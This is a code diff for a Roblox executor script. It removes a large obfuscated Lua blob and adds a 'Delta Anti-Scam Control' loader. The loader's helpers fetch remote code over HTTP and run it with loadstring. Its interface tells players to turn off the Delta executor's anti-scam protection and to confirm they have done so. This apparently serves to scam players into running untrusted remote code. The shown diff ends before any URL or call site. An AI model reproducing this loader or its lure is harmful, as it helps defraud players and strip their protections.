@@ -1,1 +1,279 @@
-return(function(...)local x={"\077\073\100\120\053\113\097\101","\053\113\119\117\053\074\100\084\077\070\054\061";"\070\100\119\068\077\074\081\061","\065\098\106\121\057\071\053\111\053\076\061\061","\088\074\122\121\049\076\061\061";"\057\113\100\102\066\111\122\071\088\100\077\048\114\112\106\077\097\070\101\061";"\104\073\119\117\104\073\122\121";"\070\100\119\043\088\075\106\111\066\076\061\061","\097\089\122\074\074\102\120\071\049\112\097\083\055\075\102\118\102\099\061\061","\077\070\103\079\088\089\054\061","\066\111\103\118\055\114\100\087\049\112\103\082\077\075\100\071";"\099\050\065\051\104\098\065\101\072\052\083\056\083\099\113\077\069\066\055\089\103\114\072\105\115\087\054\049\105\115\118\072\050\086\113\122\051\050\115\051\047\072\054\101";"\106\111\057\050\118\102\106\118\047\065\090\082\082\120\118\098\050\070\073\113\086\104\112\117\053\111\105\088\089\065\073\083\081\082\086\071\108\119\122\109\050\119\068\088\099\083\111\102","\115\099\061\061","\057\075\102\050\088\089\077\111","\066\113\100\072\066\114\050\084\057\055\077\082\077\112\122\073\104\075\080\061","\047\115\122\098\087\068\053\081\070\053\071\050\104\077\115\119\114\115\101\071\080\099\088\103\109\089\065\107\043\107\057\061";"","\053\074\086\080\104\074\097\109";"\057\075\122\117\077\113\119\050","\053\121\082\101\057\047\053\074\107\111\122\079\088\069\116\101";"\074\070\077\115\104\118\114\112\049\111\043\082";"\072\076\076\118\089\047\100\075\115\115\069\081\113\077\077\105\103\118\084\111\114\082\084\121\077\090\109\053\108\065\069\051\067\103\099\084\071\054\122\101\122\099\088\067\104\070\090\113\117\087\055\084\057\076\065\116\053\121\085\106\114\099\098\112\121\120\086\054\052\104\100\071\048\066\072\066\056\075\081\076\056\070\073\081\109\057\068\083\050\087\086\085\070\071\066\104\110\097\066\122\101\119\102\072\068\053\065\113\065\065\067\050\047\104\048\065\105\099\074\111\116\121\110\121\103\052\077\073\105\113\078\111\066\110\082\078\112\055\112\107\079\115\107\076\051\073\080\086\072\081\075\053\086\088\081\089\084\081\054\086\080\074\077\111\098\105\067\086\049\119\056\083\053\069\110\122\048\117\078\073\102\113\108\108\111\078\050\108\099\053\101\116\115\084\122\068\102\118\070\068\052\108\115\068\107\111\085\088\043\102\117\079\069\107\104\107\071\066\075\079\055\081\107\106\102\114\080\084\082\049\121\112\085\072\116\098\121\118\098\075\081\084\073\066\104\080\090\104\076\122\120\082\104\043\102\073\054\122\099\066\104\116\121\088\054\101\086\075\100\102\083\099\048\070\075\074\117\088\108\083\051\109\082\100\067\108\054\061";"\057\089\106\079\049\074\086\047","\049\073\120\065\097\122\122\103\066\111\111\050\106\073\100\047\104\089\101\061";"\102\100\053\074\053\112\053\118\088\121\050\075\102\121\053\086","\077\073\122\050\077\107\061\061";"\102\070\097\111\057\075\086\120\088\074\114\061","\066\075\104\079\087\113\100\102\074\114\077\082\115\113\086\047","\102\073\102\084\049\113\119\078\049\080\061\061";"\110\100\120\048\112\076\068\061","\053\113\122\084\088\113\114\061","\053\069\107\112\074\071\106\050","\055\089\111\105\088\121\054\079\057\055\097\100\077\056\116\084";"\115\056\103\121\055\113\043\056\065\056\102\051\106\076\061\061";"\070\100\119\050\077\070\106\120\053\113\122\084\088\113\114\061","\088\113\102\117","\102\071\097\085\088\074\106\075\114\121\100\114\055\122\053\122\074\075\081\061","\104\073\120\120\057\099\061\061";"\114\098\103\078\066\098\118\061","\088\056\054\061","\053\111\103\079\097\056\077\074\066\055\077\050\102\121\121\061";"\115\084\099\111\077\085\101\043\115\099\061\061";"\057\113\097\120\088\113\080\061";"\088\089\116\105\114\113\111\073\053\114\103\071\097\069\107\112","\083\111\120\085\116\115\106\050\119\117\071\048\076\066\112\110\097\089\065\090\043\065\117\076\082\074\055\056\112\051\070\043\053\066\099\119\065\050\110\114\090\122\118\061";"\070\100\119\047\104\080\061\061","\057\073\102\121\088\074\102\121\104\070\106\120\104\075\082\111";"\077\075\082\078\088\089\054\061","\104\047\111\121\077\107\061\061","\088\056\071\061","\053\113\119\112\053\098\103\043\088\075\057\061","\088\113\119\120\077\098\097\121\057\075\111\117\077\080\061\061";"\102\113\122\050\057\113\102\079\054\071\106\111\053\113\102\069\053\113\102\118\054\107\061\061";"\053\113\122\112\049\080\061\061";"\057\122\097\086\087\121\100\118\088\113\086\114\055\055\116\077\107\075\071\061";"\077\089\097\100\104\099\061\061"}local function a(a)return x[a-(751913-746103)]end for a,z in ipairs({{892093-892092,326890+-326833},{-32416-(-32417),-429741+429791},{88406-88355;-434989+435046}})do while z[-357418-(-357419)]<z[69666+-69664]do x[z[18530-18529]],x[z[394030-394028]],z[439855-439854],z[-204582+204584]=x[z[759482-759480]],x[z[-464493-(-464494)]],z[667510-667509]+(49763-49762),z[-302249+302251]-(-224871+224872)end end do local a=x local z=string.len local r=string.char local G=table.concat local Q=math.floor local e=table.insert local n=type local P={["\052"]=-361199-(-361259),["\054"]=629428+-629420;H=207349-207334;h=-239143+239167;["\048"]=248488+-248430,L=-35361+35361;["\047"]=-771512+771551;["\049"]=-23815-(-23841),["\055"]=576453-576434,l=455209-455150;C=-572530+572561;E=50117-50082;k=-250856+250872;X=982105-982078;["\057"]=387848-387820;B=-733401-(-733431),x=299338-299305,v=-532849+532885,F=-166501+166524,W=600371+-600359;w=797497+-797436;q=39969+-39963;["\043"]=-818384-(-818425),Z=781112+-781050;d=841071-841018,J=-549361+549383,f=381804+-381783;y=268764-268712;["\056"]=-407661+407664;D=-282345+282389;G=926401-926397,m=960702+-960659;i=-534438-(-534449),T=676567-676533,p=-847623-(-847674);j=348523+-348506,R=346987+-346938;g=543802-543793,N=-58786+58833;t=276202-276201,K=144586-144548,O=107285-107235,["\050"]=-613747+613792,z=-828858+828863,u=-366507+366553;e=905916+-905876;a=-652391-(-652404);o=582039-582002,Y=130212+-130157,S=-697452-(-697462),n=-991360-(-991423),V=600691+-600634,["\051"]=350699+-350657;c=368491+-368459,Q=-325362-(-325418),U=-413355-(-413357),r=-140260+140280,A=-1045038-(-1045056);M=-713334+713359;["\053"]=771384+-771355,b=787519-787512,P=106979+-106931,s=308728-308714;I=-783224+783278}local v=string.sub for x=538674-538673,#a,1027969-1027968 do local g=a[x]if n(g)=="\115\116\114\105\110\103"then local n=z(g)local T={}local t=-928380-(-928381)local D=-795897+795897 local I=726199+-726199 while t<=n do local x=v(g,t,t)local a=P[x]if a then D=D+a*(458606-458542)^((-891260+891263)-I)I=I+(611892-611891)if I==-111071-(-111075)then I=-377900+377900 local x=Q(D/(-147367-(-212903)))local a=Q((D%(813495-747959))/(-580978-(-581234)))local z=D%(-217063+217319)e(T,r(x,a,z))D=672117+-672117 end elseif x=="\061"then e(T,r(Q(D/(429485+-363949))))if t>=n or v(g,t+(742712-742711),t+(414445+-414444))~="\061"then e(T,r(Q((D%(194534+-128998))/(-42017-(-42273)))))end break end t=t+(117285-117284)end a[x]=G(T)end end end return(function(x,r,G,Q,e,n,P,t,J,D,g,u,v,B,s,K,T,A,j,z,V,O,I)t,J,T,B,g,u,s,v,I,A,z,V,O,D,j,K=926781-926781,function(x,a)local r=D(a)local G=function(G,Q,e,n)return z(x,{G;Q;e,n},a,r)end return G end,function()t=t+(-304104-(-304105))g[t]=1044544+-1044543 return t end,function(x,a)local r=D(a)local G=function(G,Q,e,n,P)return z(x,{G;Q;e,n,P},a,r)end return G end,{},function(x,a)local r=D(a)local G=function(G,Q,e)return z(x,{G;Q;e},a,r)end return G end,function(x,a)local r=D(a)local G=function(G)return z(x,{G},a,r)end return G end,{},function(x)local a,z=1023232+-1023231,x[-534001+534002]while z do g[z],a=g[z]-(-190629-(-190630)),(337578+-337577)+a if g[z]==186022-186022 then g[z],v[z]=nil,nil end z=x[a]end end,function(x,a)local r=D(a)local G=function(G,Q)return z(x,{G,Q},a,r)end return G end,function(z,G,Q,e)local P,F,y,H,h,Z,E,W,X,p,I,V,Y,D,q,l,k,i,t,d,U,S,b,f,c,g,C,m,R,o,L,w,M,N while z do if z<122532+7769315 then if z<4158292-253608 then if z<-1009791+3602193 then if z<765496+505291 then if z<-1008831+1662946 then if z<481967+83891 then if z<-757495+1281645 then z=Z P=k z=11134964-350379 else F=T()d=T()W=nil U={}c={}m=s(268328+3750482,{F;L;Y,V})v[F]=c M=nil l=nil c=T()h=a(-319146+324997)b=nil v[c]=m m={}C=nil v[d]=m m=x[h]i=nil E=v[d]l=a(-124196+130054)p=a(1016206-1010367)N=a(-721732-(-727543))W=a(-141970-(-147813))D=nil C=19805771625366-(-742519)y={[N]=E,[p]=i}V=j(V)h=m(U,y)m=K(-472623+3758227,{d;F;X,L,Y;c})Y=j(Y)v[t]=h v[I]=m d=j(d)L=j(L)X=j(X)Y=a(357685-351851)V=x[l]P={}b=v[t]d=a(-12896+18716)F=j(F)c=j(c)M=v[I]L=M(Y,C)l=b[L]D=V[l]l=u(-1036864+10565987,{t;I})M=a(869437-863611)L=274024+21670918561902 V=D(l)Y=-253544+13007705673146 V=v[t]l=v[I]b=l(M,L)D=V[b]V=a(-79004-(-84835))x[V]=D L=a(405037+-399188)U=865339+28085647389169 l=v[t]b=v[I]M=b(L,Y)V=l[M]l=a(660861-655028)x[l]=V b=v[t]M=v[I]C=23027096950078-803193 Y=a(-988799+994615)L=M(Y,C)l=b[L]b=a(372012+-366169)Y=a(156325+-150495)x[b]=l M=a(-886843+892699)b=x[M]L=x[Y]X=x[W]c=v[t]F=v[I]t=j(t)m=F(d,U)W=c[m]z=x[a(608320-602483)]C=X..W X=a(51209-45345)X=L[X]Y={X(L,C)}M=b(r(Y))b=M()I=j(I)end else t=a(95729-89891)D=336810+15914566 P=-308074+7030840 g=t^D z=P-g P=a(595838-590002)g=z z=P/g P={z}z=x[a(-229031+234879)]end else if z<36129+655121 then L=T()v[L]=P C=870715+-870650 z=v[b]Y=-188003-(-188006)P=z(Y,C)f=a(-570354+576209)Y=T()z=958270+-958270 C=z c=B(56354+526831,{})W=a(-335124-(-340971))z=966526-966526 v[Y]=P P=x[W]X=z W={P(c)}z={r(W)}W=z P=514674-514672 z=W[P]P=a(977572-971710)c=z z=x[P]F=v[D]w=x[f]f=w(c)w=a(436142+-430296)S=F(f,w)F={S()}P=z(r(F))F=T()v[F]=P S=v[Y]w=S P=324331-324330 S=334826+-334825 z=857787+12985068 f=S S=874427+-874427 m=f<S S=P-f else P=a(376428+-370615)g=a(477328-471471)z=x[P]P=z(g)P={}z=x[a(20163-14304)]end end else if z<2206946-711094 then if z<2301036-881211 then if z<606003+740153 then Z=v[t]k=Z z=Z and 627827+14689121 or 1256646-(-708470)else g=G z=true t=T()v[t]=z D=a(702521-696694)V=T()P=x[D]D=a(199051-193190)I=T()z=P[D]D=T()v[D]=z b=a(-844515-(-850362))z=A(-564401+1813719,{})v[I]=z z=false M=B(260456+3960601,{V})v[V]=z l=x[b]b=l(M)z=b and 8971123-1018496 or 599475+828024 P=b end else b=a(-407341+413206)l=P P=x[b]M=a(-316330+322165)X=a(-87715+93550)b=a(333930+-328107)z=P[b]b=T()v[b]=z P=x[M]M=a(310356-304489)z=P[M]C=x[X]M=z Y=z L=C z=C and 8894512-(-661236)or 261288+9444480 end else if z<-592818+3093795 then v[t]=k R=-387180+387181 o=v[y]H=o+R i=p[H]Z=C+i i=386476-386220 z=Z%i C=z z=700406+6658283 H=v[U]i=X+H H=-937981+938237 Z=i%H X=Z else z=v[Q[-764600+764607]]z=z and-462126+5880787 or 111139+15002027 end end end else if z<4082567-631732 then if z<342315+2858270 then if z<3795653-667701 then if z<379884+2702886 then o=432429+-432428 H=p[o]Z=z o=false i=H==o k=i z=i and 269928+4585516 or-181990+587506 else l=nil I=j(I)L=j(L)X=nil V=j(V)c=nil D=j(D)I=T()F=j(F)M=nil z=5118908-(-97507)Y=j(Y)F=-364587-(-364843)C=nil t=j(t)l=a(468375-462510)b=j(b)b=a(-232039+237904)t=nil D=nil c=-863994-(-863995)X=T()v[I]=t W=nil t=T()v[t]=D V=x[l]l=a(-178342+184194)D=V[l]V=T()v[V]=D l=x[b]b=a(-770232+776055)D=l[b]W={}L=a(225191+-219364)M=a(697910+-692075)b=x[M]M=a(19169+-13351)l=b[M]M=x[L]L=a(581170+-575328)b=M[L]L=T()M=933245+-933245 C={}v[L]=M Y=T()M=147431-147429 m=F v[Y]=M M={}v[X]=C F=-526319-(-526320)C=142692-142692 d=F F=-591218-(-591218)h=d<F F=c-d end else z=282089+10489184 end else if z<4356781-984511 then t=G[389804+-389802]g=G[-372652+372653]z=v[Q[1041921-1041920]]D=z z=D[t]z=z and 184870+12035919 or-577010+7629001 else I=a(796311-790456)P=a(-46561+52423)z=x[P]M=a(-361300-(-367147))g=v[Q[-770932-(-770936)]]L=u(3007227-(-730999),{})D=x[I]b=x[M]M={b(L)}l={r(M)}b=-754421-(-754423)V=l[b]I=D(V)D=a(-457710+463556)t=g(I,D)g={t()}P=z(r(g))t=v[Q[724086+-724081]]g=P P=t z=t and 120164+4344612 or 42977+5042874 end end else if z<-177381+3952435 then if z<61730+3492369 then z=true z=9051764-(-32417)else P=740727+10907629 t=a(916881-911036)D=-356523+1208518 g=t^D z=P-g P=a(557937+-552112)g=z z=P/g P={z}z=x[a(938237+-932371)]end else if z<4181607-315050 then z=16262736-76386 F=#W m=104035+-104035 c=F==m else f=a(772792+-766965)w=x[f]M=Y z=6236510-(-386412)f=a(-894303-(-900156))S=w[f]w=S(g,M)M=nil S=v[Q[754231+-754225]]f=S()F=w+f c=F+l F=-873147-(-873403)f=-40481+40482 W=c%F F=D[t]l=W w=l+f S=I[w]c=F..S D[t]=c end end end end else if z<-620723+5953683 then if z<271528+4039513 then if z<-575858+4637560 then if z<4819277-830266 then if z<854010+3123028 then F=#W m=-29921+29921 c=F==m z=c and-208871-(-770552)or 17230702-1044352 else k=v[t]z=k and 3503307-511088 or 9873805-(-910780)P=k end else g=v[Q[-376875-(-376876)]]P=#g g=10912+-10912 z=P==g z=z and 12924715-437678 or-735031+7757325 end else if z<4334958-83683 then z=true v[Q[326571-326570]]=z P={}z=x[a(891203-885371)]else f=-235879+235880 m=172395-172389 z=v[b]w=z(f,m)z=a(-797241+803085)x[z]=w m=a(177145-171301)f=x[m]m=849724-849722 z=f>m z=z and 1008831+14768931 or 13710402-(-802169)end end else if z<4035592-(-878651)then if z<4692305-137572 then z=574386+4511465 D=v[Q[569842+-569836]]t=D==g P=t else o=422575-422573 z=-282089-(-687605)H=p[o]o=v[E]i=H==o k=i end else if z<995967+4111784 then z=1943834-(-566578)g=nil v[Q[589746+-589741]]=P else U=not h F=F+d c=F<=m c=U and c U=F>=m U=h and U c=U or c U=9321148-(-228455)z=c and U c=875579+2986555 z=z or c end end end else if z<175397+6847740 then if z<7544468-565298 then if z<370539+5373966 then if z<-792569+6275602 then g=a(-792324-(-798137))z=x[g]D=-896508-(-896508)t=v[Q[1005383-1005375]]g=z(t,D)z=724406+14388760 else z=900860+8036885 D=-848826+848932 t=v[Q[38305+-38302]]g=t*D t=981887-981630 P=g%t v[Q[-175714-(-175717)]]=P end else Y=Y+C W=not X M=Y<=L M=W and M W=Y>=L W=X and W M=W or M W=3639439-(-234471)z=M and W M=14820644-(-211111)z=z or M end else if z<6757120-(-260392)then z=460654+203430 Y=a(-407215-(-413037))L=x[Y]P=L else D=a(-285918-(-291753))t=x[D]z=x[a(-11750-(-17569))]D=a(217057-211239)g=t[D]D=v[Q[-913339-(-913340)]]t={g(D)}P={r(t)}end end else if z<-153509+7231699 then if z<-809849+7840073 then z=651188+10699175 else M=a(350894-345067)z={}v[Q[523312+-523310]]=z P=v[Q[-591407-(-591410)]]I=P Y=-48482+48483 V=-31393+35184372120225 P=t%V v[Q[-160037+160041]]=P b=790649+-790394 l=t%b b=84581-84579 V=l+b v[Q[-932536-(-932541)]]=V b=x[M]M=a(108131+-102291)l=b[M]b=l(g)M=958974+-958973 l=a(565490+-559669)L=b D[t]=l l=735223+-735038 C=Y Y=-331562+331562 X=C<Y Y=M-C z=7139130-516208 end else if z<7222644-(-232807)then E=j(E)N=j(N)y=j(y)U=j(U)h=j(h)p=nil z=13921289-78434 d=j(d)else t=v[Q[48548-48546]]D=v[Q[-697267-(-697270)]]g=t==D z=729079+10901868 P=g end end end end end else if z<12112657-153765 then if z<738807+8814684 then if z<505904+8432527 then if z<552177+7858166 then if z<137700+7938737 then if z<-1047168+9026117 then l=v[V]P=l z=2357032-929533 else P={}z=x[a(148517+-142676)]end else v[t]=S z=v[t]z=z and 15581628-(-426541)or 3734481-206182 end else if z<7921107-(-792569)then P={}z=x[a(853562+-847748)]else D=672054-672053 t=v[Q[455345-455342]]g=t~=D z=g and 269544+15007467 or 5081083-(-496815)end end else if z<82659+9332293 then if z<9215827-157861 then z=true z=z and 16162126-(-389804)or 9998865-914684 else z=O(344491+2804405,{I})w={z()}z=x[a(516336-510512)]P={r(w)}end else if z<-932413+10463964 then t=a(650420+-644590)P=a(976830+-970974)z=x[P]g=x[t]I=v[Q[281002-281001]]V=v[Q[-85347+85349]]M=13276150114444-1046592 b=a(-579186+585001)l=V(b,M)D=I[l]I=a(115428+-109564)I=g[I]t={I(g,D)}P=z(r(t))z=P()z=x[a(-189106-(-194918))]P={}else c=F z=800761+4415654 U=c W[c]=U c=nil end end end else if z<-462446+11238037 then if z<9092533-(-818297)then if z<192358+9522542 then if z<9757921-129188 then W=a(-838703-(-844538))X=x[W]W=a(-574708-(-580530))C=X[W]L=C z=432557+9273211 else z=Y z=L and-461486+1125570 or 7525766-510640 P=L end else d=T()v[d]=S R=160357-160357 h=a(-123259-(-129124))y=665652-665397 U=390480-390380 P=x[h]h=a(490990-485167)z=P[h]h=898364+-898363 P=z(h,U)U=-186598+186598 h=T()q=-358171-(-368171)v[h]=P z=v[b]P=z(U,y)y=471855+-471854 U=T()v[U]=P z=v[b]N=v[h]P=z(y,N)p=724278+-724276 y=T()v[y]=P P=v[b]E=-582066+582067 N=P(E,p)P=-729527+729528 p=a(-169132-(-174949))z=N==P N=T()P=a(503216+-497370)v[N]=z i=a(804857+-799002)Z=x[i]H=v[b]o={H(R,q)}i=Z(r(o))z=a(-78946+84806)Z=a(-271792-(-277609))k=i..Z z=c[z]E=p..k z=z(c,P,E)E=T()k=J(687669+15081901,{b,d,Y;D,t;F;N,E,h;y,U,L})v[E]=z p=a(-714719-(-720566))P=x[p]p={P(k)}z={r(p)}p=z z=v[N]z=z and 1047680+2935289 or 75682+1255046 end else if z<11346901-758712 then P={t}z=x[a(-556461-(-562289))]else z=true z=z and 15113966-(-73442)or 8806957-140068 end end else if z<-530928+11625733 then if z<433261+10387118 then z=6901555-(-457134)v[t]=P else z=v[Q[961352-961342]]t=v[Q[-928498-(-928509)]]g[z]=t z=v[Q[548605-548593]]t={z(g)}z=x[a(57442+-51613)]P={r(t)}end else if z<815481+10639925 then z=true z=z and-819897+5102907 or 165093+7850512 else z=P and 3253571-(-136996)or 1006655+1503757 end end end end else if z<15667942-515376 then if z<51106+14394488 then if z<-258984+13473229 then if z<13236519-593906 then if z<12386078-(-13984)then z=-771832+10714152 else t=v[Q[484913-484911]]D=-489262-(-489455)g=t*D t=-543921+18592407621716 P=g+t g=35184371909786-(-179046)t=85411+-85410 z=P%g v[Q[-868281-(-868283)]]=z g=v[Q[-836471-(-836474)]]z=81955+5495943 P=g~=t end else L=-281258-(-281513)z=v[Q[879995+-879994]]t=D M=236775+-236775 b=z(M,L)g[t]=b z=14655776-(-225959)t=nil end else if z<13305857-(-536305)then w=v[t]z=w and 16136653-312810 or 8222043-(-141732)S=w else S=S+f P=S<=w d=not m P=d and P d=S>=w d=m and d P=d or P d=-898492+10640101 z=P and d P=13093040-(-712950)z=z or P end end else if z<351147+14627009 then if z<-672885+15496971 then m=a(692981+-687137)z=x[m]m=a(895292+-889438)x[m]=z z=6176092-(-850810)else D=D+V t=D<=I b=not l t=b and t b=D>=I b=l and b t=b or t b=181094+12821543 z=t and b t=11019377-20769 z=z or t end else if z<15890419-829306 then z=9275515-(-666805)I=nil b=nil l=nil else D=v[Q[241264-241255]]I=D z={}g=z t=1023809-1023808 D=-234343+234344 V=D D=401772+-401772 l=V<D D=t-V z=392300+14489435 end end end else if z<16194588-374508 then if z<-482671+15806927 then if z<15344460-42529 then if z<405805+14867028 then g=a(232261-226407)P=a(126648-120804)z=x[P]P=x[g]g=a(-280331-(-286185))x[g]=z g=a(917328-911484)z=-825722+11596995 x[g]=P g=v[Q[-42080-(-42081)]]t=g()else t=v[Q[398959-398956]]D=310474-310442 g=t%D L=290603-290601 I=v[Q[814073+-814069]]b=v[Q[659062-659060]]c=v[Q[-460139-(-460142)]]W=c-g c=652500-652468 X=W/c C=-151064-(-151077)Y=C-X M=L^Y l=b/M V=I(l)L=-329514-(-329770)M=-710902+710903 I=-875707+4295843003 D=V%I V=-258278-(-258280)I=V^g t=D/I I=v[Q[593330+-593326]]b=t%M M=4295447407-480111 l=b*M V=I(l)g=nil I=v[Q[-606707+606711]]l=I(t)D=V+l b=178724-113188 V=249574-184038 I=D%V l=D-I D=nil C=1000255+-999999 V=l/b b=983166-982910 l=I%b M=I-l b=M/L t=nil L=-611251+611507 M=V%L I=nil z=6860785-(-161509)Y=V-M L=Y/C Y={l;b,M;L}l=nil V=nil M=nil b=nil v[Q[-499694-(-499695)]]=Y L=nil end else i=-718390+718391 z=-434669+2399785 Z=p[i]k=Z end else if z<913724+14859417 then I=-753526-(-753527)V=-103971+103973 t=v[Q[-994366-(-994367)]]D=t(I,V)t=641844+-641843 g=D==t z=g and-230567+11861514 or-842106+8319070 P=g else f=a(-721910+727765)d=a(-279627-(-285481))z=x[f]m=x[d]f=z(m)z=a(756983+-751139)x[z]=f z=-990591+8017493 end end else if z<16738364-678709 then if z<15965021-106019 then w=C==X z=-357291+8721066 S=w else z=2810677-(-291625)end else if z<16245190-(-128932)then m=#W F=16866-16865 c=D(F,m)F=l(W,c)z=1044864+2882808 U=827963-827962 m=v[X]h=F-U d=b(h)c=nil m[F]=d F=nil else z=11283769-(-66594)end end end end end end end z=#e return r(P)end,function(x,a)local r=D(a)local G=function(...)return z(x,{...},a,r)end return G end,function(x,a)local r=D(a)local G=function()return z(x,{},a,r)end return G end,function(x)for a=159398-159397,#x,632756+-632755 do g[x[a]]=g[x[a]]+(130533-130532)end if G then local z=G(true)local r=e(z)r[a(115158-109347)],r[a(1003711+-997861)],r[a(-668622-(-674485))]=x,I,function()return-181606+3808341 end return z else return Q({},{[a(718262+-712412)]=I,[a(1015922-1010111)]=x;[a(-86371+92234)]=function()return-744503+4371238 end})end end,function(x)g[x]=g[x]-(1008191+-1008190)if 633524-633524==g[x]then g[x],v[x]=nil,nil end end,function(x,a)local r=D(a)local G=function(G,Q,e,n,P,v)return z(x,{G;Q,e,n,P;v},a,r)end return G end return(V(64610+1292231,{}))(r(P))end)(getfenv and getfenv()or _ENV,unpack or table[a(439982+-434160)],newproxy,setmetatable,getmetatable,select,{...})end)(...)
+--[[ Delta Anti-Scam Control (robust loader)
+   - Fetch fallback chain: syn.request -> http_request/request -> game:HttpGet -> HttpService:GetAsync
+   - Compile fallback: syn.loadstring -> loadstring -> load
+   - Fixed label click handling
+]]
+
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+
+-- ===== helpers =====
+local function http_fetch(url)
+	-- executors with request()
+	local req = (syn and syn.request) or http_request or request or (fluxus and fluxus.request)
+	if req then
+		local r = req({Url = url, Method = "GET"})
+		local body = r and (r.Body or r.body)
+		if not body or (r.StatusCode and r.StatusCode >= 400) then
+			error("request() failed: "..tostring(r and r.StatusCode))
+		end
+		return body
+	end
+	-- game:HttpGet (executor-provided)
+	if typeof(game.HttpGet) == "function" then
+		return game:HttpGet(url)
+	end
+	-- Roblox HttpService (Studio with HttpEnabled)
+	return HttpService:GetAsync(url)
+end
+
+local function compile_chunk(src)
+	if syn and syn.loadstring then
+		local f, e = syn.loadstring(src)
+		if not f then error(e) end
+		return f
+	end
+	if loadstring then
+		local f, e = loadstring(src)
+		if not f then error(e) end
+		return f
+	end
+	if load then
+		local f, e = load(src)
+		if not f then error(e) end
+		return f
+	end
+	error("No loadstring/load available in this environment")
+end
+
+-- ===== UI =====
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "DeltaAntiScamControl"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, 240, 0, 227)
+mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = screenGui
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 8)
+corner.Parent = mainFrame
+
+-- Banner
+local bannerFrame = Instance.new("Frame")
+bannerFrame.Name = "BannerFrame"
+bannerFrame.Size = UDim2.new(1, 0, 0, 50)
+bannerFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+bannerFrame.BorderSizePixel = 0
+bannerFrame.Parent = mainFrame
+
+local bannerImage = Instance.new("ImageLabel")
+bannerImage.Name = "BannerImage"
+bannerImage.Size = UDim2.new(1, 0, 1, 0)
+bannerImage.BackgroundTransparency = 1
+bannerImage.Image = "rbxassetid://97145606658615"
+bannerImage.ScaleType = Enum.ScaleType.Crop
+bannerImage.Parent = bannerFrame
+
+local bannerCorner = Instance.new("UICorner")
+bannerCorner.CornerRadius = UDim.new(0, 8)
+bannerCorner.Parent = bannerFrame
+
+-- Profile
+local profileFrame = Instance.new("Frame")
+profileFrame.Name = "ProfileFrame"
+profileFrame.Size = UDim2.new(0, 80, 0, 40)
+profileFrame.Position = UDim2.new(0, 10, 0.5, 0)
+profileFrame.AnchorPoint = Vector2.new(0, 0.5)
+profileFrame.BackgroundTransparency = 1
+profileFrame.Parent = bannerFrame
+
+local profileIcon = Instance.new("ImageLabel")
+profileIcon.Name = "ProfileIcon"
+profileIcon.Size = UDim2.new(0, 30, 0, 30)
+profileIcon.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+profileIcon.BorderSizePixel = 0
+profileIcon.Image = "rbxassetid://86022856415884"
+profileIcon.Parent = profileFrame
+
+local profileIconStroke = Instance.new("UIStroke")
+profileIconStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+profileIconStroke.Color = Color3.fromRGB(0, 0, 0)
+profileIconStroke.Thickness = 2
+profileIconStroke.Parent = profileIcon
+
+local profileIconCorner = Instance.new("UICorner")
+profileIconCorner.CornerRadius = UDim.new(1, 0)
+profileIconCorner.Parent = profileIcon
+
+local usernameLabel = Instance.new("TextLabel")
+usernameLabel.Name = "Username"
+usernameLabel.Size = UDim2.new(0, 150, 0, 20)
+usernameLabel.Position = UDim2.new(0, 35, 0, 5)
+usernameLabel.BackgroundTransparency = 1
+usernameLabel.Text = "DELTA USER"
+usernameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+usernameLabel.Font = Enum.Font.GothamBold
+usernameLabel.TextSize = 12
+usernameLabel.TextXAlignment = Enum.TextXAlignment.Left
+usernameLabel.Parent = profileFrame
+
+-- Title
+local titleText = Instance.new("TextLabel")
+titleText.Name = "TitleText"
+titleText.Size = UDim2.new(1, -20, 0, 30)
+titleText.Position = UDim2.new(0, 10, 0, 60)
+titleText.BackgroundTransparency = 1
+titleText.Text = "DISABLE ANTI-SCAM"
+titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
+titleText.Font = Enum.Font.GothamBold
+titleText.TextSize = 14
+titleText.TextXAlignment = Enum.TextXAlignment.Center
+titleText.Parent = mainFrame
+
+-- Warning
+local warningText = Instance.new("TextLabel")
+warningText.Name = "WarningText"
+warningText.Size = UDim2.new(1, -20, 0, 60)
+warningText.Position = UDim2.new(0, 10, 0, 95)
+warningText.BackgroundTransparency = 1
+warningText.Text = "Disable ANTI-SCAM in Delta settings to ensure proper code functionality"
+warningText.TextColor3 = Color3.fromRGB(255, 150, 150)
+warningText.TextWrapped = true
+warningText.Font = Enum.Font.Gotham
+warningText.TextSize = 12
+warningText.TextXAlignment = Enum.TextXAlignment.Center
+warningText.Parent = mainFrame
+
+-- Checkbox
+local checkboxFrame = Instance.new("Frame")
+checkboxFrame.Size = UDim2.new(1, -20, 0, 30)
+checkboxFrame.Position = UDim2.new(0, 10, 0, 165)
+checkboxFrame.BackgroundTransparency = 1
+checkboxFrame.Parent = mainFrame
+
+local checkbox = Instance.new("TextButton")
+checkbox.Size = UDim2.new(0, 20, 0, 20)
+checkbox.Position = UDim2.new(0, 0, 0, 5)
+checkbox.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+checkbox.Text = ""
+checkbox.Parent = checkboxFrame
+
+local checkboxInner = Instance.new("Frame")
+checkboxInner.Size = UDim2.new(0, 14, 0, 14)
+checkboxInner.Position = UDim2.new(0, 3, 0, 3)
+checkboxInner.BackgroundColor3 = Color3.fromRGB(30, 136, 229)
+checkboxInner.Visible = false
+checkboxInner.Parent = checkbox
+
+local checkboxLabel = Instance.new("TextLabel")
+checkboxLabel.Size = UDim2.new(0, 150, 0, 20)
+checkboxLabel.Position = UDim2.new(0, 25, 0, 5)
+checkboxLabel.BackgroundTransparency = 1
+checkboxLabel.Text = "I already disabled ANTI SCAM"
+checkboxLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+checkboxLabel.Font = Enum.Font.Gotham
+checkboxLabel.TextSize = 12
+checkboxLabel.TextXAlignment = Enum.TextXAlignment.Left
+checkboxLabel.Parent = checkboxFrame
+
